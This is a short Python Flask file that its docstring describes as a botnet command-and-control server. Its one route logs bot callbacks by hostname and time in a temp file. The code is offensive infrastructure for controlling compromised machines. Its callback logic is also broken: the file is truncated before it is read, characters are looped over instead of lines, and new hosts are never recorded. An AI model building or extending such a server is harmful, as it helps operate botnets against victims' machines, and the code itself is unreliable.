"""
Process POST/GET requests from clients/commander, distribute commands and keep 
track of bot callbacks
@author: degenerat3
"""

from flask import Flask, request
import os
import datetime

app = Flask(__name__)


@app.route('/api/callback')
def process_callbacks():
    content = request.json
    hostname = content['hostname']
    hostname = hostname.lower()
    calltime = content['time']
    if not os.path.isfile("/tmp/cc/callbacks.txt"):
        with open("/tmp/cc/callbacks.txt", "w+") as f:
            data = f.read()
            if hostname in data:
                new_d = ""
                for line in data:
                    if hostname in line:
                        new_l = hostname + ":    " + calltime + "\n"
                        new_d += new_l
                    else:
                        new_d += line
                f.write(new_d)
                
